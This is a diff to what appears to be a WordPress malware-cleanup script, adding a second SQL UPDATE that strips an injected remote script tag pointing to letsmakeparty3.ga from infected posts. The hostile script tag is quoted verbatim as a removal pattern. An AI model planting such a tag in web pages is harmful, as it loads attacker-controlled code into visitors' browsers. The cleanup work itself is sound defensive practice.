@@ -54,6 +54,7 @@ try:
                 # Delete the payload if infected
                 if bool(re.search(regex, post[0], flags = re.M)):
                     cur.execute("UPDATE "+TABLE_SCHEMA+"."+TABLE_NAME+" set post_content = REPLACE(post_content,\"<script src='https://letsmakeparty3.ga/l.js?qs=1' type='text/javascript'></script>\",\"\") WHERE post_content LIKE '%letsmakeparty3%'")
+                    cur.execute("UPDATE "+TABLE_SCHEMA+"."+TABLE_NAME+" set post_content = REPLACE(post_content,\"<script src='https://letsmakeparty3.ga/l.js?n=1' type=text/javascript></script>\",\"\") WHERE post_content LIKE '%letsmakeparty3%'")
                     CLEANED_POSTS += 1
     
     # Find wp_option table if renamed
